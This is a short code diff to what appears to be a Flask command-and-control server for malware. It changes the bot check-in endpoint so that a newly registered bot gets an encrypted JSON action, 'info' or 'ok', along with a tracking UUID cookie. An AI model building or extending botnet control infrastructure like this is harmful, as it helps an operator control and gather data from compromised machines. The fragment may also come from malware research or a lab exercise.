@@ -34,7 +34,12 @@ def heartbeat():
 
         if 'X-Session-ID' not in request.cookies:
             print("New checkin at " + str(checkin))
-            resp = flask.Response(mal_encode(app.malware_key, str(checkin)))
+            response_json = {}
+            if app.info_on_first_checkin:
+                response_json["action"] = "info"
+            else:
+                response_json["action"] = "ok"
+            resp = flask.Response(mal_encode(app.malware_key, json.dumps(response_json)))
             bot_id = uuid.uuid1()
             print("Adding new UUID to db:" + str(bot_id))
             resp.set_cookie("X-Session-ID", str(bot_id), expires=datetime.datetime.now() + datetime.timedelta(days=30))
